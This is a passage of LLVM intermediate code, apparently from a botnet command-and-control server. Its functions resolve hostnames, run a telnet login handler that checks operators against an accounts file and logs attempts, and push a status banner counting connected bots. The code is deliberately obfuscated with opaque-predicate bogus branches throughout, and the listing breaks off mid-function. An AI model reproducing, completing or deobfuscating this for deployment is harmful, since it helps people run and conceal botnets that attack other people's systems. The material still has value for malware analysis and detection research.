define i32 @hostname_to_ip(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %6, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0)) #7
  store i32 1, i32* %3, align 4
  br label %40

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %6, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = bitcast i8** %16 to %struct.in_addr**
  store %struct.in_addr** %17, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  br label %18

; <label>:18:                                     ; preds = %36, %13
  %19 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %19, i64 %21
  %23 = load %struct.in_addr*, %struct.in_addr** %22, align 8
  %24 = icmp ne %struct.in_addr* %23, null
  br i1 %24, label %25, label %39

; <label>:25:                                     ; preds = %18
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %27, i64 %29
  %31 = load %struct.in_addr*, %struct.in_addr** %30, align 8
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = call i8* @inet_ntoa(i32 %33) #7
  %35 = call i8* @strcpy(i8* %26, i8* %34) #7
  store i32 0, i32* %3, align 4
  br label %40
                                                  ; No predecessors!
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  br label %18

; <label>:39:                                     ; preds = %18
  store i32 1, i32* %3, align 4
  br label %40

; <label>:40:                                     ; preds = %39, %25, %12
  %41 = load i32, i32* @x.19
  %42 = load i32, i32* @y.20
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %40
  %49 = load i32, i32* %3, align 4
  %50 = load i32, i32* @x.19
  %51 = load i32, i32* @y.20
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %49

originalBBalteredBB:                              ; preds = %originalBB, %40
  %58 = load i32, i32* %3, align 4
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [4 x i8*], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1000 x i8], align 16
  store i8* %0, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = ptrtoint i8* %9 to i64
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %4, align 4
  %12 = bitcast [4 x i8*]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([4 x i8*]* @titleWriter.spinbuf to i8*), i64 32, i32 16, i1 false)
  %13 = bitcast [1000 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1000, i32 16, i1 false)
  br label %14

; <label>:14:                                     ; preds = %89, %1
  %15 = load i32, i32* @x.21
  %16 = load i32, i32* @y.22
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  store i32 0, i32* %7, align 4
  %23 = load i32, i32* @x.21
  %24 = load i32, i32* @y.22
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %31

; <label>:31:                                     ; preds = %86, %originalBBpart2
  %32 = load i32, i32* @x.21
  %33 = load i32, i32* @y.22
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = icmp ult i64 %41, 4
  %43 = load i32, i32* @x.21
  %44 = load i32, i32* @y.22
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %51, label %89

; <label>:51:                                     ; preds = %originalBBpart24
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 2048, i32 16, i1 false)
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %54 = call i32 @clientsConnected()
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [4 x i8*], [4 x i8*]* %6, i64 0, i64 %56
  %58 = load i8*, i8** %57, align 8
  %59 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i32 0, i32 0
  %60 = call i32 (i8*, i8*, ...) @sprintf(i8* %53, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i32 0, i32 0), i32 27, i32 %54, i8* %58, i8* %59, i32 7) #7
  %61 = load i32, i32* %4, align 4
  %62 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %63 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #8
  %65 = call i64 @send(i32 %61, i8* %62, i64 %64, i32 16384)
  %66 = icmp eq i64 %65, -1
  br i1 %66, label %67, label %84

; <label>:67:                                     ; preds = %51
  %68 = load i32, i32* @x.21
  %69 = load i32, i32* @y.22
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* @x.21
  %77 = load i32, i32* @y.22
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart28, %51
  %85 = call i32 @sleep(i32 1)
  br label %86

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %7, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %7, align 4
  br label %31

; <label>:89:                                     ; preds = %originalBBpart24
  br label %14
                                                  ; No predecessors!
  %91 = load i8*, i8** %2, align 8
  ret i8* %91

originalBBalteredBB:                              ; preds = %originalBB, %14
  store i32 0, i32* %7, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %92 = load i32, i32* %7, align 4
  %93 = sext i32 %92 to i64
  %94 = icmp ult i64 %93, 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  br label %originalBB6
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct._IO_FILE*, align 8
  %23 = alloca %struct._IO_FILE*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca [512 x i8], align 16
  %28 = alloca [512 x i8], align 16
  %29 = alloca [100 x i8*], align 16
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca [20 x i8], align 16
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca [50 x i8*], align 16
  %43 = alloca %struct._IO_FILE*, align 8
  %44 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %45 = load i8*, i8** %3, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  %48 = load volatile i32, i32* @managesConnected, align 4
  %49 = add nsw i32 %48, 1
  store volatile i32 %49, i32* @managesConnected, align 4
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8** %12, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i32 0, i32 0), i8** %13, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8** %14, align 8
  store i32 0, i32* %16, align 4
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 2048, i32 16, i1 false)
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %19, align 4
  %53 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %53, %struct._IO_FILE** %18, align 8
  br label %54

; <label>:54:                                     ; preds = %75, %1
  %55 = load i32, i32* @x.23
  %56 = load i32, i32* @y.24
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %64 = call i32 @feof(%struct._IO_FILE* %63) #7
  %65 = icmp ne i32 %64, 0
  %66 = xor i1 %65, true
  %67 = load i32, i32* @x.23
  %68 = load i32, i32* @y.24
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %66, label %75, label %80

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %77 = call i32 @fgetc(%struct._IO_FILE* %76)
  store i32 %77, i32* %20, align 4
  %78 = load i32, i32* %19, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %19, align 4
  br label %54

; <label>:80:                                     ; preds = %originalBBpart2
  store i32 0, i32* %21, align 4
  %81 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  call void @rewind(%struct._IO_FILE* %81)
  br label %82

; <label>:82:                                     ; preds = %originalBBpart220, %80
  %83 = load i32, i32* %21, align 4
  %84 = load i32, i32* %19, align 4
  %85 = sub nsw i32 %84, 1
  %86 = icmp ne i32 %83, %85
  br i1 %86, label %87, label %123

; <label>:87:                                     ; preds = %82
  %88 = load i32, i32* @x.23
  %89 = load i32, i32* @y.24
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %87
  %96 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %97 = load i32, i32* %21, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %98
  %100 = getelementptr inbounds %struct.account, %struct.account* %99, i32 0, i32 0
  %101 = getelementptr inbounds [200 x i8], [200 x i8]* %100, i32 0, i32 0
  %102 = load i32, i32* %21, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %103
  %105 = getelementptr inbounds %struct.account, %struct.account* %104, i32 0, i32 1
  %106 = getelementptr inbounds [200 x i8], [200 x i8]* %105, i32 0, i32 0
  %107 = load i32, i32* %21, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %108
  %110 = getelementptr inbounds %struct.account, %struct.account* %109, i32 0, i32 2
  %111 = getelementptr inbounds [200 x i8], [200 x i8]* %110, i32 0, i32 0
  %112 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* %101, i8* %106, i8* %111)
  %113 = load i32, i32* %21, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %21, align 4
  %115 = load i32, i32* @x.23
  %116 = load i32, i32* @y.24
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart220, label %originalBB9alteredBB

originalBBpart220:                                ; preds = %originalBB9
  br label %82

; <label>:123:                                    ; preds = %82
  %124 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %125 = load i32, i32* %4, align 4
  %126 = call i32 @fdgets(i8* %124, i32 2048, i32 %125)
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %123
  br label %1920

; <label>:129:                                    ; preds = %123
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %131 = load i8*, i8** %14, align 8
  %132 = call i8* @strstr(i8* %130, i8* %131) #8
  %133 = icmp ne i8* %132, null
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %129
  br label %136

; <label>:135:                                    ; preds = %129
  br label %1920

; <label>:136:                                    ; preds = %134
  %137 = load i32, i32* @x.23
  %138 = load i32, i32* @y.24
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %136
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %146 = call i32 (i8*, i8*, ...) @sprintf(i8* %145, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i32 0, i32 0)) #7
  %147 = load i32, i32* %4, align 4
  %148 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %150 = call i64 @strlen(i8* %149) #8
  %151 = call i64 @send(i32 %147, i8* %148, i64 %150, i32 16384)
  %152 = icmp eq i64 %151, -1
  %153 = load i32, i32* @x.23
  %154 = load i32, i32* @y.24
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %152, label %161, label %178

; <label>:161:                                    ; preds = %originalBBpart224
  %162 = load i32, i32* @x.23
  %163 = load i32, i32* @y.24
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %161
  %170 = load i32, i32* @x.23
  %171 = load i32, i32* @y.24
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %1920

; <label>:178:                                    ; preds = %originalBBpart224
  %179 = load i32, i32* @x.23
  %180 = load i32, i32* @y.24
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %178
  %187 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %188 = load i32, i32* %4, align 4
  %189 = call i32 @fdgets(i8* %187, i32 2048, i32 %188)
  %190 = icmp slt i32 %189, 1
  %191 = load i32, i32* @x.23
  %192 = load i32, i32* @y.24
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %190, label %199, label %200

; <label>:199:                                    ; preds = %originalBBpart232
  br label %1920

; <label>:200:                                    ; preds = %originalBBpart232
  %201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %201)
  %202 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %204 = call i32 (i8*, i8*, ...) @sprintf(i8* %202, i8* %203) #7
  %205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %205, i8** %9, align 8
  %206 = load i8*, i8** %9, align 8
  %207 = call i32 @Search_in_File(i8* %206)
  store i32 %207, i32* %5, align 4
  %208 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %208, %struct._IO_FILE** %22, align 8
  %209 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %210 = load i8*, i8** %9, align 8
  %211 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %209, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %210)
  %212 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %213 = call i32 @fclose(%struct._IO_FILE* %212)
  %214 = load i8*, i8** %9, align 8
  %215 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %214)
  %216 = load i8*, i8** %9, align 8
  %217 = load i32, i32* %5, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %218
  %220 = getelementptr inbounds %struct.account, %struct.account* %219, i32 0, i32 0
  %221 = getelementptr inbounds [200 x i8], [200 x i8]* %220, i32 0, i32 0
  %222 = call i32 @strcmp(i8* %216, i8* %221) #8
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %224, label %285

; <label>:224:                                    ; preds = %200
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %226 = call i32 (i8*, i8*, ...) @sprintf(i8* %225, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i32 0, i32 0)) #7
  %227 = load i32, i32* %4, align 4
  %228 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %230 = call i64 @strlen(i8* %229) #8
  %231 = call i64 @send(i32 %227, i8* %228, i64 %230, i32 16384)
  %232 = icmp eq i64 %231, -1
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %224
  br label %1920

; <label>:234:                                    ; preds = %224
  %235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %236 = load i32, i32* %4, align 4
  %237 = call i32 @fdgets(i8* %235, i32 2048, i32 %236)
  %238 = icmp slt i32 %237, 1
  br i1 %238, label %239, label %240

; <label>:239:                                    ; preds = %234
  br label %1920

; <label>:240:                                    ; preds = %234
  %241 = load i32, i32* @x.23
  %242 = load i32, i32* @y.24
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %240
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %249)
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %251 = load i32, i32* %5, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %252
  %254 = getelementptr inbounds %struct.account, %struct.account* %253, i32 0, i32 1
  %255 = getelementptr inbounds [200 x i8], [200 x i8]* %254, i32 0, i32 0
  %256 = call i32 @strcmp(i8* %250, i8* %255) #8
  %257 = icmp ne i32 %256, 0
  %258 = load i32, i32* @x.23
  %259 = load i32, i32* @y.24
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %257, label %266, label %283

; <label>:266:                                    ; preds = %originalBBpart236
  %267 = load i32, i32* @x.23
  %268 = load i32, i32* @y.24
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %266
  %275 = load i32, i32* @x.23
  %276 = load i32, i32* @y.24
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %286

; <label>:283:                                    ; preds = %originalBBpart236
  %284 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %284, i8 0, i64 2048, i32 16, i1 false)
  br label %298

; <label>:285:                                    ; preds = %200
  br label %286

; <label>:286:                                    ; preds = %285, %originalBBpart240
  %287 = load i32, i32* %4, align 4
  %288 = call i64 @send(i32 %287, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i64 5, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

; <label>:290:                                    ; preds = %286
  br label %1920

; <label>:291:                                    ; preds = %286
  %292 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %292, %struct._IO_FILE** %23, align 8
  %293 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %294 = load i8*, i8** %9, align 8
  %295 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %293, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0), i8* %294)
  %296 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %297 = call i32 @fclose(%struct._IO_FILE* %296)
  br label %1920

; <label>:298:                                    ; preds = %283
  %299 = load i32, i32* %4, align 4
  %300 = call i64 @send(i32 %299, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 14, i32 16384)
  %301 = icmp eq i64 %300, -1
  br i1 %301, label %302, label %303

; <label>:302:                                    ; preds = %298
  br label %1920

; <label>:303:                                    ; preds = %298
  %304 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %305 = load i32, i32* %5, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %306
  %308 = getelementptr inbounds %struct.account, %struct.account* %307, i32 0, i32 0
  %309 = getelementptr inbounds [200 x i8], [200 x i8]* %308, i32 0, i32 0
  %310 = call i32 (i8*, i8*, ...) @sprintf(i8* %304, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %309) #7
  %311 = load i32, i32* %4, align 4
  %312 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %313 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %314 = call i64 @strlen(i8* %313) #8
  %315 = call i64 @send(i32 %311, i8* %312, i64 %314, i32 16384)
  %316 = icmp eq i64 %315, -1
  br i1 %316, label %317, label %318

; <label>:317:                                    ; preds = %303
  br label %1920

; <label>:318:                                    ; preds = %303
  %319 = load i8*, i8** %3, align 8
  %320 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %319) #7
  %321 = load i32, i32* %4, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %322
  %324 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %323, i32 0, i32 2
  %325 = getelementptr inbounds [20 x i8], [20 x i8]* %324, i32 0, i32 0
  %326 = load i32, i32* %5, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %327
  %329 = getelementptr inbounds %struct.account, %struct.account* %328, i32 0, i32 0
  %330 = getelementptr inbounds [200 x i8], [200 x i8]* %329, i32 0, i32 0
